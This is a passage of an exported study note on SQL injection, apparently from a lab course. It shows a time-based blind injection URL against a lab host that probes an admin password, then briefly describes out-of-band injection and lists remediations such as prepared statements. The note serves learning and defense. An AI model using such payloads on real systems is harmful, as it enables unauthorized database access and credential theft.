src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25e3eecd-ed53-80c4-b614-cb0a3d27972c" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">https://website.thm/analytics?referrer=admin123&#x27; UNION SELECT SLEEP(5),2 from users where username=&#x27;admin&#x27; and password like &#x27;4961&#x27;;--</code></pre></div><div style="display:contents" dir="ltr"><figure id="25e3eecd-ed53-80d2-ab51-d5c5eb1bf77e" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2019.png"><img style="width:547px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2019.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="25e3eecd-ed53-807f-830d-cd1225076dce" class="">Out of Band </h2></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-80b2-a296-f32a977fe028" class="">It is not as common as it requires some specific feature enabled in the database server or the web application business logic.  It is classified by two different communication channel, one to lauch the attack and other to get the results.</p></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-8003-b12c-dc6d6f890009" class="">It needs like and HTTP/DNS connection from the database for the result.</p></div><div style="display:contents" dir="auto"><h2 id="25e3eecd-ed53-8060-8366-e8924544b0e2" class="">Remediation</h2></div><div style="display:contents" dir="auto"><ul id="25e3eecd-ed53-802a-a0d1-e36403ea8ee8" class="bulleted-list"><li style="list-style-type:disc">Escaping User Input - characters like ‘ “ $ \ can cause SQL queries to break and that could lead to injection attacks. Escaping user input is a method of prepending a backslash \ to these characters, which then parses the payload as string.</li></ul></div><div style="display:contents" dir="auto"><ul id="25e3eecd-ed53-80e6-aca0-db6b20c59a30" class="bulleted-list"><li style="list-style-type:disc">Input Validation - Employing an allow list that only takes in a set of keywords as input. Or a string replacement method where characters can be filtered out using allow or disallow.</li></ul></div><div style="display:contents" dir="auto"><ul id="25e3eecd-ed53-8030-be5c-d96393d14f77" class="bulleted-list"><li style="list-style-type:disc">Prepared Statements with parameterized queries - first the developer writes the query then the input is added as a parameter.</li></ul></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-809b-b6b8-db8233b7181f" class="">
+</p></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-80ae-8cb0-fc89aaa013c6" class="">
+</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
